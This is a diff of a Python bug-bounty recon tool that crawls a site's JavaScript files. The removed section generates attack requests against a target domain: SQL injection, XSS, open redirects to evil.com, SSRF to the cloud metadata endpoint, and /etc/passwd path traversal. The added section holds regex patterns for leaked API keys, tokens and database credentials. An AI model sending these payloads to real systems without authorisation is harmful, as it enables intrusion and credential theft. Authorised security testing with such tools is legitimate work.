-                f"GET  {full}?search=\'--",
-                f"GET  {full}?sort=id%27%20AND%20sleep(5)--%20-",
-                f"GET  {full}?filter=1%27%20UNION%20SELECT%20null,null,null--",
-                f"GET  {full}?order_d=ASC\' AND 1=1--",
-            ])
-        test_cases.append({
-            "vuln_class":  "SQL Injection",
-            "severity":    "critical",
-            "description": "SQL-like parameter construction detected. Order/sort/search parameters may be vulnerable.",
-            "tests":       sqli_cases[:10],
-            "tip":         "Start with time-based blind: sleep(5). If the response is delayed 5s, SQLi is confirmed. Use sqlmap for automation.",
-        })
+        # Stripe restricted key
+        (r'rk_live_[0-9a-zA-Z]{24,}',
+         "Stripe Restricted Key — active payment credential", "critical"),
 
-    # ── XSS test cases ────────────────────────────────────────────────────
-    if "XSS" in vuln_indicators:
-        xss_cases = []
-        for ep in ep_list[:5]:
-            full = domain + ep if ep.startswith("/") else domain + "/" + ep
-            xss_cases.extend([
-                f"GET  {full}?search=<script>alert(document.cookie)</script>",
-                f"GET  {full}?q=\"\"><img src=x onerror=alert(1)>",
-                f"GET  {full}?filter=<svg onload=alert(1)>",
-                f"GET  {full}?redirect=javascript:alert(document.domain)",
-            ])
-        test_cases.append({
-            "vuln_class":  "Cross-Site Scripting (XSS)",
-            "severity":    "medium",
-            "description": "User input appears to flow into DOM sinks (innerHTML, document.write). Test all input parameters.",
-            "tests":       xss_cases[:8],
-            "tip":         "Use Burp Collaborator or XSS Hunter to catch blind XSS. Test in the search, filter, and redirect parameters first.",
-        })
+        # SendGrid — SG. + two base64 blocks
+        (r'SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}',
+         "SendGrid API Key", "critical"),
 
-    # ── Open Redirect test cases ──────────────────────────────────────────
-    if "OpenRedirect" in vuln_indicators:
-        redirect_cases = []
-        full = domain
-        redirect_cases.extend([
-            f"GET  {full}/login?redirect=https://evil.com",
-            f"GET  {full}/login?next=//evil.com",
-            f"GET  {full}/login?return_url=https://evil.com",
-            f"GET  {full}/login?redirect=javascript:alert(1)",
-            f"GET  {full}/logout?goto=https://evil.com",
-        ])
-        test_cases.append({
-            "vuln_class":  "Open Redirect",
-            "severity":    "medium",
-            "description": "Redirect parameters detected in JS. These may be exploitable for phishing via open redirect.",
-            "tests":       redirect_cases,
-            "tip":         "A 302 redirect to your evil.com = confirmed. Can be chained with OAuth flows for account takeover.",
-        })
+        # GitHub tokens — all have unique prefixes
+        (r'gh[pousr]_[A-Za-z0-9]{36,}',
+         "GitHub Personal Access Token", "critical"),
 
-    # ── SSRF test cases ───────────────────────────────────────────────────
-    if "SSRF" in vuln_indicators:
-        ssrf_cases = []
-        for ep in ep_list[:3]:
-            full = domain + ep if ep.startswith("/") else domain + "/" + ep
-            ssrf_cases.extend([
-                f"POST {full}  body: {{\"url\": \"http://169.254.169.254/latest/meta-data/\"}}",
-                f"POST {full}  body: {{\"webhook\": \"http://127.0.0.1:8080/admin\"}}",
-                f"POST {full}  body: {{\"target\": \"http://internal.service/\"}}",
-                f"GET  {full}?url=http://169.254.169.254/latest/meta-data/",
-                f"GET  {full}?callback=http://your.burp.collab.server/",
-            ])
-        test_cases.append({
-            "vuln_class":  "Server-Side Request Forgery (SSRF)",
-            "severity":    "high",
-            "description": "URL parameters passed to server-side fetch/request calls detected. May allow internal network access.",
-            "tests":       ssrf_cases[:8],
-            "tip":         "Use Burp Collaborator as target. AWS metadata endpoint (169.254.169.254) confirms cloud SSRF. Internal IPs expose network topology.",
-        })
+        (r'github_pat_[A-Za-z0-9_]{82,}',
+         "GitHub Fine-Grained Personal Access Token", "critical"),
 
-    # ── Path Traversal test cases ─────────────────────────────────────────
-    if "PathTraversal" in vuln_indicators:
-        pt_cases = []
-        for ep in ep_list[:3]:
-            full = domain + ep if ep.startswith("/") else domain + "/" + ep
-            pt_cases.extend([
-                f"GET  {full}?file=../../../etc/passwd",
-                f"GET  {full}?path=..%2F..%2F..%2Fetc%2Fpasswd",
-                f"GET  {full}?template=../../../../config/database.yml",
-                f"GET  {full}?filename=....//....//etc/passwd",
-                f"GET  {full}/download?file=..%252F..%252Fetc%252Fpasswd",
-            ])
-        test_cases.append({
-            "vuln_class":  "Path Traversal",
-            "severity":    "high",
-            "description": "File/path parameters detected with server-side file operations. Test for directory traversal.",
-            "tests":       pt_cases[:8],
-            "tip":         "If /etc/passwd contents appear in the response, it\'s confirmed critical. Also try Windows paths: ..\\..\\windows\\win.ini",
-        })
+        # Google API key — AIza prefix
+        (r'AIza[0-9A-Za-z\-_]{35}',
+         "Google API Key", "critical"),
 
-    # ── Source Map test cases ─────────────────────────────────────────────
-    if source_maps:
-        sm_cases = [f"GET  {sm}  # If this returns JSON, it\'s full source code exposure" for sm in source_maps[:5]]
-        test_cases.append({
-            "vuln_class":  "Source Map Exposure (Information Disclosure)",
-            "severity":    "medium",
-            "description": "Source map files referenced in JS. If publicly accessible, they expose the full original unminified source code.",
-            "tests":       sm_cases,
-            "tip":         "A 200 response with JSON containing \'sources\' and \'mappings\' = confirmed. Download all .map files and use source-map-explorer to reconstruct source.",
-        })
+        # Google OAuth token
+        (r'ya29\.[0-9A-Za-z\-_]{40,}',
+         "Google OAuth Access Token — live token", "critical"),
 
-    # ── Mass Assignment test cases ────────────────────────────────────────
-    if "MassAssignment" in vuln_indicators:
-        ma_cases = []
-        for ep in ep_list[:3]:
-            full = domain + ep if ep.startswith("/") else domain + "/" + ep
-            ma_cases.extend([
-                f"POST {full}  body: {{\"role\": \"admin\", \"is_admin\": true}}",
-                f"PUT  {full}/1  body: {{\"user[role]\": \"admin\"}}",
-                f"PATCH {full}/1  body: {{\"admin\": true, \"verified\": true}}",
-                f"POST {full}  body: {{\"permission_level\": 99, \"bypass_auth\": true}}",
-            ])
-        test_cases.append({
-            "vuln_class":  "Mass Assignment",
-            "severity":    "high",
-            "description": "Object spread or req.body assignment patterns detected. Server may accept unexpected fields.",
-            "tests":       ma_cases[:8],
-            "tip":         "Try adding admin:true, role:admin, is_verified:true to any POST/PUT/PATCH body. If accepted = privilege escalation.",
-        })
+        # Slack webhook — very specific URL format
+        (r'https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}',
+         "Slack Webhook URL — can post messages to Slack", "critical"),
 
-    return test_cases
+        # Slack token
+        (r'xox[baprs]-[0-9]{8,12}-[0-9A-Za-z\-]{10,}',
+         "Slack API Token", "critical"),
+
+        # Private keys — PEM format is globally unique
+        (r'-----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+|DSA\s+)?PRIVATE KEY-----',
+         "Private Key (PEM format) — hardcoded in JS", "critical"),
+
+        # GCP service account JSON
+        (r'"type"\s*:\s*"service_account"',
+         "Google Cloud Service Account JSON key", "critical"),
+
+        # Shopify tokens
+        (r'shpat_[A-Za-z0-9]{32}',
+         "Shopify Admin API Access Token", "critical"),
+
+        # OpenAI key
+        (r'sk-[A-Za-z0-9]{48}',
+         "OpenAI API Key", "critical"),
+
+        # NPM token
+        (r'npm_[A-Za-z0-9]{36,}',
+         "NPM Access Token", "critical"),
+
+        # JWT — three base64url parts, starts with eyJ (base64 of '{')
+        (r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9._\-]{10,}\.[A-Za-z0-9_\-]{10,}',
+         "JSON Web Token (JWT) — may be a live session/auth token", "high"),
+
+        # Database connection strings with credentials
+        (r'mongodb(?:\+srv)?://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{4,}@[^\s"\'<]{8,}',
+         "MongoDB connection string with credentials", "critical"),
+
+        (r'mysql://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{4,}@[^\s"\'<]{8,}',
+         "MySQL connection string with credentials", "critical"),
+
+        (r'postgresql://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{4,}@[^\s"\'<]{8,}',
+         "PostgreSQL connection string with credentials", "critical"),
+
+        # URL with embedded credentials
+        (r'https?://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%]{6,}@[A-Za-z0-9\-\.]+\.[a-z]{2,}',
+         "URL with embedded credentials (user:password@host)", "critical"),
+
+        # Source map reference — information disclosure if accessible
+        (r'//[#@]\s*sourceMappingURL=(\S+\.map)',
+         "Source map reference — if accessible, exposes full unminified source code", "medium"),
+
+        # Internal IPs hardcoded
+        (r'["\'](?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+["\']',
+         "Internal/private IP address hardcoded in JS", "medium"),
+
+        # Firebase config block
+        (r'firebaseConfig\s*=\s*\{[^}]{50,}\}',
+         "Firebase configuration block — contains project credentials", "high"),
+    ]
+
+    for pattern, description, severity in patterns:
+        try:
+            for m in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
+                matched  = m.group(0)[:150]
+                line_num = content[:m.start()].count("\n") + 1
+                line_ctx = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
+
+                # skip if it's clearly a placeholder
+                if re.search(
+                    r'(?:example|placeholder|your[_\-]?key|insert[_\-]?here|'
+                    r'xxxx|1234|abcd|test123|changeme)',
+                    matched, re.IGNORECASE
+                ):
+                    continue
+
+                key = hashlib.md5(matched.encode()).hexdigest()
+                if key in seen:
+                    continue
+                seen.add(key)
+
+                findings.append({
+                    "type":        "Information Disclosure",
+                    "severity":    severity,
+                    "description": description,
+                    "match":       matched,
+                    "line":        line_num,
+                    "context":     line_ctx,
+                })
+        except re.error:
+            continue
+
+    return findings
 
 
-def generate_bounty_report(domain, js_file, test_cases, precision_secrets, url_constructors):
-    """
-    Generate a formatted, submittable bug bounty report section.
-    Structured exactly like how programs want reports submitted.
-    """
-    if not test_cases and not precision_secrets and not url_constructors:
-        return None
+# ─────────────────────────────────────────────────────────────────────────────
+#  LIVE ENDPOINT PROBE
+#  Actually request each discovered endpoint and show the real HTTP status.
+#  This is the only way to know if an endpoint actually exists.
+# ─────────────────────────────────────────────────────────────────────────────
 
-    now = datetime.datetime.now().strftime("%Y-%m-%d")
-    report = []
-
-    report.append("=" * 70)
-    report.append("BUG BOUNTY REPORT — JSReaper Intelligence Engine")
-    report.append(f"Generated: {now}")
-    report.append(f"Target:    {domain}")
-    report.append(f"JS File:   {js_file}")
-    report.append("=" * 70)
-    report.append("")
-
-    if precision_secrets:
-        report.append("── SECRETS FOUND ───────────────────────────────────────────────")
-        for s in precision_secrets[:10]:
-            report.append(f"  Service  : {s['service']}")
-            report.append(f"  Severity : {s['severity'].upper()}")
-            report.append(f"  Match    : {s['match'][:80]}")
-            report.append(f"  File     : {s['source_file']}")
-            report.append(f"  Line     : {s['line']}")
-            report.append("")
-
-    if url_constructors:
-        report.append("── API ENDPOINTS DISCOVERED ────────────────────────────────────")
-        for uc in url_constructors[:15]:
-            report.append(f"  Endpoint : {uc['endpoint']}")
-            report.append(f"  Line     : {uc['line']}")
-            report.append(f"  Context  : {uc['context'][:80]}")
-            report.append("")
-
-    for tc in test_cases:
-        report.append(f"── {tc['vuln_class'].upper()} ──────────────────────────────")
-        report.append(f"  Severity    : {tc['severity'].upper()}")
-        report.append(f"  Description : {tc['description']}")
-        report.append(f"  Tip         : {tc['tip']}")
-        report.append("")
-        report.append("  Test Cases:")
-        for t in tc["tests"]:
-            report.append(f"    {t}")
-        report.append("")
-
-    report.append("── REPORT TEMPLATE ─────────────────────────────────────────────")
-    report.append("  Title: Information Disclosure / API Exposure in Client-Side JS")
-    report.append("  Steps:")
-    report.append(f"    1. Load {domain}")
-    report.append(f"    2. View source of {js_file}")
-    report.append("    3. [See specific findings above]")
-    report.append("  Impact: Exposes internal API structure, endpoints, and potential")
-    report.append("          access control vulnerabilities.")
-    report.append("")
-
-    return "\n".join(report)
+def probe_endpoint(url, session, timeout=8):
+    """Probe a URL and return (status, size, redirect, ms)."""
+    t = time.time()
+    try:
+        r = session.get(url, timeout=timeout, verify=False, allow_redirects=False)
+        ms    = int((time.time() - t) * 1000)
+        redir = r.headers.get("Location","") if r.status_code in [301,302,303,307,308] else ""
+        return r.status_code, len(r.content), redir, ms
+    except Exception:
+        return 0, 0, "", int((time.time()-t)*1000)
 
 
-def print_intelligence_report(domain, analysis_results, session, args):
-    """
-    Print the full intelligence report — actionable, DeepSeek-style output.
-    Covers: precision secrets, URL constructors, vuln indicators, test cases.
-    """
-    all_precision    = []
-    all_constructors = []
-    all_indicators   = {}
-    all_source_maps  = []
+# ─────────────────────────────────────────────────────────────────────────────
+#  JS FILE CRAWLER
+# ─────────────────────────────────────────────────────────────────────────────
 
-    for res in analysis_results:
-        all_precision.extend(res.get("precision_secrets", []))
-        all_constructors.extend(res.get("url_constructors", []))
-        for vuln, hits in res.get("vuln_indicators", {}).items():
-            if vuln not in all_indicators:
-                all_indicators[vuln] = []
-            all_indicators[vuln].extend(hits)
-        all_source_maps.extend(res.get("source_maps", []))
-
-    if not all_precision and not all_constructors and not all_indicators:
-        return []
-
-    section_header("INTELLIGENCE REPORT", FG_CORR)
-    print(f"  {FG_CORR}Deep JS analysis: endpoint discovery, vuln indicators, test cases{RESET}\n")
-    w = term_width()
-
-    # Precision secrets
-    if all_precision:
-        print(f"  {FG_CRITICAL}{'─'*40}")
-        print(f"  PRECISION SECRETS  ({len(all_precision)} found){RESET}")
-        for s in all_precision:
-            badge = SEVERITY_BADGE.get(s["severity"], "")
-            sev   = s["severity"].upper()
-            print(f"  {badge} {sev:<8} {RESET}  {FG_CRITICAL}{s['service']:<30}{RESET}  {FG_URL}Line {s['line']}{RESET}")
-            print(f"    {FG_DIM}File: {s['source_file'][:w-10]}{RESET}")
-            print(f"    {FG_HIGH}{s['match'][:w-10]}{RESET}\n")
-
-    # URL constructors
-    if all_constructors:
-        print(f"  {FG_SECTION}{'─'*40}")
-        print(f"  API ENDPOINT CONSTRUCTORS  ({len(all_constructors)} found){RESET}")
-        print(f"  {FG_DIM}These functions build all API URLs — finding them = finding the entire API surface.{RESET}\n")
-        for uc in all_constructors[:20]:
-            fname = uc["source_file"].split("/")[-1][:30]
-            print(f"    {FG_URL}-> {uc['endpoint'][:w-10]}{RESET}  {FG_DIM}(L{uc['line']}  {fname}){RESET}")
-        if len(all_constructors) > 20:
-            info(f"  ... and {len(all_constructors)-20} more in output file")
-        print()
-
-    # Vulnerability indicators
-    if all_indicators:
-        print(f"  {FG_MEDIUM}{'─'*40}")
-        print(f"  VULNERABILITY INDICATORS  ({len(all_indicators)} classes){RESET}")
-        print(f"  {FG_DIM}Code patterns that suggest these vulnerability classes are worth testing.{RESET}\n")
-        for vuln, hits in sorted(all_indicators.items()):
-            plural = "s" if len(hits) > 1 else ""
-            print(f"    {FG_MEDIUM}+ {vuln}  ({len(hits)} indicator{plural}){RESET}")
-            for h in hits[:2]:
-                print(f"      {FG_DIM}L{h['line']:4d}  {h['match'][:w-16]}{RESET}")
-        print()
-
-    # Source maps
-    if all_source_maps:
-        print(f"  {FG_HIGH}{'─'*40}")
-        print(f"  SOURCE MAPS  ({len(all_source_maps)}) — INFORMATION DISCLOSURE{RESET}")
-        print(f"  {FG_DIM}If accessible, these expose full unminified source code.{RESET}\n")
-        for sm in all_source_maps[:10]:
-            print(f"    {FG_URL}TEST: GET {sm}{RESET}")
-        print()
-
-    # Generate test cases
-    test_cases = generate_test_payloads(
-        f"https://{domain}", all_constructors, all_indicators, all_source_maps
-    )
-
-    if test_cases:
-        print(f"  {FG_SUCCESS}{'─'*40}")
-        print(f"  ACTIONABLE TEST CASES  ({len(test_cases)} vulnerability classes){RESET}")
-        print(f"  {FG_DIM}Ready-to-use test URLs. Copy and run in Burp Suite or curl.{RESET}\n")
-
-        for tc in test_cases:
-            sev_color = FG_CRITICAL if tc["severity"] == "critical" else FG_HIGH if tc["severity"] == "high" else FG_MEDIUM
-            badge     = SEVERITY_BADGE.get(tc["severity"], "")
-            print(f"  {badge} {tc['vuln_class']} {RESET}")
-            print(f"  {FG_DIM}  {tc['description'][:w-4]}{RESET}")
-            print(f"  {FG_SUCCESS}  Tip: {tc['tip'][:w-7]}{RESET}\n")
-            for t in tc["tests"][:8]:
-                print(f"    {sev_color}{t[:w-4]}{RESET}")
-            print()
-
-    return test_cases
-
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  JS CONTENT ANALYSIS
-# ═════════════════════════════════════════════════════════════════════════════
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  PARAMETER EXTRACTION ENGINE
-#
-#  Real bug bounty value: find all URL parameters, form fields, API params,
-#  and function arguments that the app sends or accepts.
-#  These are the inputs you test for injection, IDOR, XSS, etc.
-#
-#  This is different from just listing URLs — we extract:
-#    - Query parameters: ?id=, ?user=, ?token=
-#    - API endpoint + parameter combinations
-#    - Form field names
-#    - Function parameter names in fetch/axios calls
-#    - GraphQL query variables
-# ═════════════════════════════════════════════════════════════════════════════
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  JS FILE DISCOVERY
-#  Crawls a page and extracts all JavaScript file references three ways:
-#    1. Standard <script src="..."> tags
-#    2. Other tags (link, a, iframe) for non-JS interesting files
-#    3. Raw regex scan of the HTML for any .js reference
-# ═════════════════════════════════════════════════════════════════════════════
-
-def extract_js_from_page(url, session, waf_aware=False):
-    """
-    Crawl a page and extract all JS and interesting file references.
-    Returns (js_files_set, other_files_set, response).
-    Automatically tries HTTPS then HTTP fallback.
-    """
-    js_files    = set()
-    other_files = set()
-
-    url, resp = try_http_fallback(url, session, timeout=15)
+def crawl_js_files(url, session):
+    """Crawl a page and return set of JS file URLs."""
+    js_files = set()
+    url, resp = fetch_with_fallback(url, session)
     if not resp:
-        error(f"Could not reach: {url}")
-        return js_files, other_files, None
-
-    waf = detect_waf(resp)
-    if waf:
-        warn(f"WAF detected: {', '.join(waf)}")
-        if waf_aware:
-            warn("WAF-aware mode active — slowing down...")
-
-    if resp.status_code not in [200, 201]:
-        warn(f"HTTP {resp.status_code} for {url}")
+        return js_files, None
 
     try:
-        soup     = BeautifulSoup(resp.text, "html.parser")
+        soup = BeautifulSoup(resp.text, "html.parser")
     except Exception:
-        return js_files, other_files, resp
+        return js_files, resp
 
-    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
 
-    # method 1: <script src="..."> tags
+    # script src tags
     for tag in soup.find_all("script", src=True):
-        src_val  = tag.get("src", "")
-        if not src_val:
-            continue
-        full = urljoin(url, src_val)
-        if ".js" in full.split("?")[0]:
-            js_files.add(full)
+        src = tag.get("src","")
+        if src:
+            full = urljoin(url, src)
+            if ".js" in full.split("?")[0]:
+                js_files.add(full)
 
-    # method 2: other tags for interesting non-JS files
-    for tag in soup.find_all(["link", "a", "iframe", "img"]):
-        href = tag.get("href", "") or tag.get("src", "")
-        if href:
-            full = urljoin(url, href)
-            for ext in INTERESTING_EXTENSIONS:
-                if ext in full.lower() and ext != ".js":
-                    other_files.add(full)
-
-    # method 3: regex scan raw HTML for any .js path not caught above
-    raw = resp.text
-    for pattern in [
+    # regex scan of raw HTML for any .js reference
+    for pat in [
         r'src\s*[=:]\s*["\']([^"\']+\.js(?:\?[^"\']*)?)["\']',
-        r'import\s+[^"\']*["\']([^"\']+\.js)["\']',
         r'require\s*\(\s*["\']([^"\']+\.js)["\']',
-        r'["\']([/a-zA-Z0-9_\-\.]+\.js(?:\?[a-zA-Z0-9=&_\-\.]+)?)["\']',
+        r'import\s+[^"\']*["\']([^"\']+\.js)["\']',
     ]:
         try:
-            for match in re.finditer(pattern, raw, re.IGNORECASE):
-                path = match.group(1)
-                if path.startswith("//"):
-                    full = "https:" + path
-                elif path.startswith("/"):
-                    full = base_url + path
-                elif path.startswith("http"):
-                    full = path
-                else:
-                    full = urljoin(url, path)
+            for m in re.finditer(pat, resp.text, re.IGNORECASE):
+                path = m.group(1)
+                if path.startswith("//"):      full = "https:" + path
+                elif path.startswith("/"):     full = base + path
+                elif path.startswith("http"):  full = path
+                else:                          full = urljoin(url, path)
                 if ".js" in full.split("?")[0]:
                     js_files.add(full)
         except re.error:
             continue
 
-    return js_files, other_files, resp
+    return js_files, resp
 
 
-def extract_parameters_and_endpoints(content, source_url=""):
-    """
-    Extract URL parameters, API endpoints, form fields, and function call
-    patterns from JS file content.
+# ─────────────────────────────────────────────────────────────────────────────
+#  PRINT FINDINGS
+# ─────────────────────────────────────────────────────────────────────────────
 
-    Returns dict with:
-      all       — every endpoint+param combo found
-      sensitive — those with security-relevant parameter names (id, token, etc.)
-      count     — total count
-    """
-    findings = []
-    seen     = set()
-
-    def add(endpoint, params, method="GET", ptype="url_param", context=""):
-        key = hashlib.md5(f"{endpoint}{str(sorted(params))}".encode()).hexdigest()
-        if key in seen:
-            return
-        seen.add(key)
-        findings.append({
-            "endpoint": endpoint,
-            "params":   list(params),
-            "method":   method,
-            "type":     ptype,
-            "context":  context[:100],
-        })
-
-    # 1. fetch() with string URL
-    for m in re.finditer(
-        r'fetch\s*\(\s*(["\'][^"\']{3,80}["\'])',
-        content, re.IGNORECASE
-    ):
-        raw = m.group(1).strip('"\'')
-        if raw.startswith('/') or raw.startswith('http'):
-            nearby  = content[m.start():min(m.start()+400, len(content))]
-            body_m  = re.search(r'body\s*:\s*JSON\.stringify\s*\(\s*\{([^}]{0,200})\}', nearby, re.IGNORECASE)
-            params  = set(re.findall(r'(\w+)\s*:', body_m.group(1))) if body_m else set()
-            method  = "POST" if body_m else "GET"
-            add(raw, params, method, "fetch", m.group(0)[:80])
-
-    # 2. fetch() with template literal
-    for m in re.finditer(r'fetch\s*\(\s*`([^`]{3,100})`', content, re.IGNORECASE):
-        tpl    = m.group(1)
-        params = set(re.findall(r'\$\{(\w+)\}', tpl))
-        ep     = re.sub(r'\$\{[^}]+\}', '*', tpl)
-        if ep.startswith('/') or ep.startswith('http'):
-            add(ep, params, "GET", "fetch_template", tpl[:80])
-
-    # 3. axios calls
-    for m in re.finditer(
-        r'axios\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']{3,80})["\']',
-        content, re.IGNORECASE
-    ):
-        method   = m.group(1).upper()
-        endpoint = m.group(2)
-        nearby   = content[m.start():min(m.start()+300, len(content))]
-        body_m   = re.search(r'\{([^}]{0,200})\}', nearby)
-        params   = set(re.findall(r'(\w+)\s*:', body_m.group(1))) if body_m else set()
-        add(endpoint, params, method, "axios", m.group(0)[:80])
-
-    # 4. XMLHttpRequest
-    for m in re.finditer(
-        r'\.open\s*\(\s*["\']([A-Z]+)["\'],\s*["\']([^"\']{3,80})["\']',
-        content, re.IGNORECASE
-    ):
-        method   = m.group(1).upper()
-        endpoint = m.group(2)
-        add(endpoint, set(), method, "xhr", m.group(0)[:80])
-
-    # 5. URL with query string parameters
-    for m in re.finditer(
-        r'["\']([/?][^\s"\'<>]{2,80}\?[^\s"\'<>]{2,100})["\']',
-        content, re.IGNORECASE
-    ):
-        full = m.group(1)
-        if '?' in full:
-            path, qs = full.split('?', 1)
-            params   = set(re.findall(r'(\w+)=', qs))
-            if params:
-                add(path, params, "GET", "url_param", full[:80])
-
-    # 6. URLSearchParams / FormData append calls
-    for m in re.finditer(
-        r'(?:searchParams|formData|params|data)\.(?:append|set)\s*\(\s*["\'](\w+)["\']',
-        content, re.IGNORECASE
-    ):
-        param_name = m.group(1)
-        nearby     = content[max(0, m.start()-200):m.start()]
-        url_m      = re.search(r'["\']([/?][^"\']{2,60})["\']', nearby)
-        endpoint   = url_m.group(1) if url_m else "(unknown)"
-        add(endpoint, {param_name}, "POST", "form_data", m.group(0)[:60])
-
-    # 7. GraphQL operations
-    for m in re.finditer(
-        r'(?:query|mutation)\s+(\w+)\s*(?:\(([^)]{0,200})\))?\s*\{',
-        content, re.IGNORECASE
-    ):
-        op_name = m.group(1)
-        args    = m.group(2) or ""
-        params  = set(re.findall(r'\$(\w+)', args))
-        add(f"graphql:{op_name}", params, "POST", "graphql", m.group(0)[:80])
-
-    # 8. Route definitions (React Router, Vue Router, etc.)
-    for m in re.finditer(
-        r'(?:path|route)\s*:\s*["\']([^"\']{2,80})["\']',
-        content, re.IGNORECASE
-    ):
-        path   = m.group(1)
-        params = set(re.findall(r':(\w+)', path))
-        if path.startswith('/'):
-            add(path, params, "GET", "route", m.group(0)[:60])
-
-    # 9. REST API client patterns (e.g. this.http.get('/api/users/' + id))
-    for m in re.finditer(
-        r'(?:this\.|self\.)?(?:http|client|api|service)\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']{3,80})["\']',
-        content, re.IGNORECASE
-    ):
-        method   = m.group(1).upper()
-        endpoint = m.group(2)
-        add(endpoint, set(), method, "http_client", m.group(0)[:80])
-
-    # ── Flag security-sensitive parameter names ────────────────────────────
-    SENSITIVE_PARAMS = {
-        # IDOR candidates — direct object references
-        'id', 'user_id', 'userid', 'uid', 'account_id', 'object_id',
-        'record_id', 'doc_id', 'item_id', 'order_id', 'invoice_id',
-        'customer_id', 'profile_id', 'report_id', 'message_id',
-        # auth params — may bypass auth or access tokens
-        'token', 'access_token', 'auth', 'api_key', 'apikey', 'key',
-        'session', 'session_id', 'sessionid', 'cookie', 'jwt',
-        'auth_token', 'authorization',
-        # open redirect candidates
-        'redirect', 'redirect_uri', 'return_url', 'next', 'url',
-        'callback', 'return', 'destination', 'forward', 'goto',
-        # path traversal candidates
-        'file', 'path', 'filename', 'filepath', 'dir', 'folder',
-        'document', 'template', 'include', 'page', 'load',
-        # injection candidates
-        'cmd', 'command', 'exec', 'run', 'query', 'sql', 'search',
-        'filter', 'where', 'sort', 'order', 'group', 'limit',
-        # privilege escalation candidates
-        'role', 'permission', 'priv', 'privilege', 'admin', 'level',
-        'type', 'scope', 'access', 'right',
-        # enumeration candidates
-        'email', 'username', 'user', 'name', 'phone', 'mobile',
-        'ssn', 'dob', 'address', 'zip', 'postcode',
-    }
-
-    sensitive_found = []
-    for f in findings:
-        hit = SENSITIVE_PARAMS & {p.lower() for p in f["params"]}
-        if hit:
-            sensitive_found.append({**f, "sensitive_params": sorted(list(hit))})
-
-    return {
-        "all":       findings,
-        "sensitive": sensitive_found,
-        "count":     len(findings),
-    }
-
-
-def analyze_js_content(url, content, beautify=False, source_domain=""):
-    """
-    Full analysis of one JS file.
-    source_domain is the domain this file belongs to — used in reports
-    so findings are always clearly attributed.
-    """
-    results = {
-        "url":              url,
-        "source_domain":    source_domain or get_domain(url),
-        "size":             len(content),
-        "findings":         [],
-        "endpoints":        [],
-        "parameters":       {},
-        "js_relations":     [],
-        "technologies":     {},
-        "tech_risks":       [],
-        "precision_secrets":[],
-        "url_constructors": [],
-        "vuln_indicators":  {},
-        "source_maps":      [],
-        "score":            0,
-        "library_file":     False,
-        "library_reason":   "",
-    }
-
-    if beautify and JS_BEAUTIFIER:
-        try:
-            content = jsbeautifier.beautify(content)
-        except Exception:
-            pass
-
-    lines         = content.split("\n")
-    seen_findings = set()
-
-    # ── library file detection ──────────────────────────────────────────────
-    # if this is a third-party vendor file, massively restrict what we report.
-    # only report CRITICAL findings (real keys, PEM blocks) from library files.
-    # skip all OWASP, endpoint, and infrastructure patterns.
-    is_lib, lib_reason = is_library_file(url, content[:2000])
-    if is_lib:
-        results["library_file"] = True
-        results["library_reason"] = lib_reason
-        # only run high-value patterns on library files
-        LIBRARY_SAFE_CATEGORIES = {"AWS Credentials", "Authentication & Passwords",
-                                   "Cloud & Infrastructure", "Database Credentials"}
-        for category, patterns in SENSITIVE_PATTERNS.items():
-            if category not in LIBRARY_SAFE_CATEGORIES:
-                continue
-            for pattern, severity in patterns:
-                if severity not in ("critical",):   # only critical from library files
-                    continue
-                try:
-                    for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
-                        matched_str = match.group(0)[:120]
-                        line_num    = content[:match.start()].count("\n") + 1
-                        line_ctx    = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
-                        dedup_key   = hashlib.md5(f"{category}{matched_str}".encode()).hexdigest()
-                        if dedup_key in seen_findings:
-                            continue
-                        seen_findings.add(dedup_key)
-                        conf = assess_finding_confidence(matched_str, line_ctx, category,
-                                                         severity, results["source_domain"])
-                        if conf["confidence"] == "filtered":
-                            continue
-                        results["findings"].append({
-                            "category": category, "severity": conf["adjusted_severity"],
-                            "original_severity": severity, "match": matched_str,
-                            "line": line_num, "context": line_ctx,
-                            "source_domain": results["source_domain"], "source_file": url,
-                            "confidence": conf["confidence"],
-                            "confidence_score": conf["confidence_score"],
-                            "fp_reason": conf["fp_reason"],
-                            "library_file": True,
-                        })
-                        results["score"] += 100  # only critical findings from libs
-                except re.error:
-                    continue
-        # skip the rest of analysis for library files
-        results["endpoints"] = extract_parameters_and_endpoints(content, url)
-        return results
-
-    for category, patterns in SENSITIVE_PATTERNS.items():
-        for pattern, severity in patterns:
-            try:
-                for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
-                    matched_str = match.group(0)[:120]
-                    line_num    = content[:match.start()].count("\n") + 1
-                    line_ctx    = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
-                    dedup_key   = hashlib.md5(f"{category}{matched_str}".encode()).hexdigest()
-                    if dedup_key in seen_findings:
-                        continue
-                    seen_findings.add(dedup_key)
-
-                    # ── run through false positive reduction engine ──────
-                    # every finding is scored for confidence before we keep it
-                    conf = assess_finding_confidence(
-                        matched_str, line_ctx, category, severity,
-                        source_domain=results["source_domain"]
-                    )
-
-                    # drop anything the engine marked as a false positive
-                    if conf["confidence"] == "filtered":
-                        continue
-
-                    # use the (potentially downgraded) adjusted severity
-                    effective_severity = conf["adjusted_severity"]
-
-                    results["findings"].append({
-                        "category":         category,
-                        "severity":         effective_severity,
-                        "original_severity":severity,
-                        "match":            matched_str,
-                        "line":             line_num,
-                        "context":          line_ctx,
